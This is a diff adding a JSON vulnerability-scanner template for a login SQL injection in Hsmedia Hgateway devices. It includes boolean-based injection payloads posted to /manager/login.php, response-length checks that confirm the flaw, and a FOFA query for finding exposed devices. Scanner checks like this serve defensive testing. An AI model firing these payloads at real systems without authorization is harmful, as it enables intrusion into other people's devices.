@@ -1,0 +1,105 @@
+{
+  "Name": "Hsmedia Hgateway login SQli",
+  "Description": "Hsmedia Hgateway login SQli, which may cause the server to be compromised.",
+  "Product": "Hsmedia-Hgateway",
+  "Homepage": "http://hassmedia.com/",
+  "DisclosureDate": "2020-01-13",
+  "Author": "itardc@163.com",
+  "FofaQuery": "title=\"系统登录\" && body=\"login.php\" && body=\"img/bg.gif\"",
+  "Level": "3",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "https://fofa.so/"
+  ],
+  "HasExp": true,
+  "ExpParams": null,
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "Name=admin%27%20AND%207512%3D6991%20AND%20%27dLBr%27%3D%27dLBr&Pass=passwd_never_exist",
+        "data_type": "text",
+        "follow_redirect": false,
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Origin": "{{{fixedhostinfo}}}",
+          "Referer": "{{{fixedhostinfo}}}/manager/index.php",
+          "Cookie": "PHPSESSID=bf03ta5pc9ingo1la1003l4j51"
+        },
+        "method": "POST",
+        "uri": "/manager/login.php"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "Content-Length: 78",
+            "variable": "$head"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    },
+    {
+      "Request": {
+        "data": "Name=admin%27%20AND%206959%3D6959%20AND%20%27VEXR%27%3D%27VEXR&Pass=passwd_never_exist",
+        "data_type": "text",
+        "follow_redirect": false,
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Origin": "{{{fixedhostinfo}}}",
+          "Referer": "{{{fixedhostinfo}}}/manager/index.php",
+          "Cookie": "PHPSESSID=bf03ta5pc9ingo1la1003l4j51"
+        },
+        "method": "POST",
+        "uri": "/manager/login.php"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "Content-Length: 111",
+            "variable": "$head"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": ["sqli"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": ["Hsmedia-Hgateway"]
+  }
+}
